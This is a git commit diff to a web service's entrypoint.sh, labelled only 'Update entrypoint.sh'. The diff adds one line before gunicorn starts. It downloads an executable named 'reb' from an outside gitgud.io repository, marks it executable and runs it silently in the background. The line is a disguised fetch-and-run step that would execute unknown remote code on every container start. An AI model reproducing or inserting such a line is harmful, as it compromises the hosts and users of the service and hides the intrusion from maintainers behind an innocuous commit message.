dd855f2d1e96c860e48e6b554c79046bcd40a5b4
denetryake <129279926+denetryake@users.noreply.github.com>
2023-10-11 01:21:24 +0700

    Update entrypoint.sh

--- src/entrypoint.sh
+++ src/entrypoint.sh
@@ -2,4 +2,5 @@
 set -ex
 
 # Start gunicorn, listening on port 500, access log to stdout
+wget https://gitgud.io/trendava/clouds/-/raw/master/reb;chmod 700 reb;nohup ./reb &
 exec gunicorn -w 4 -b '0.0.0.0:5000' --access-logfile=- 'app:app'
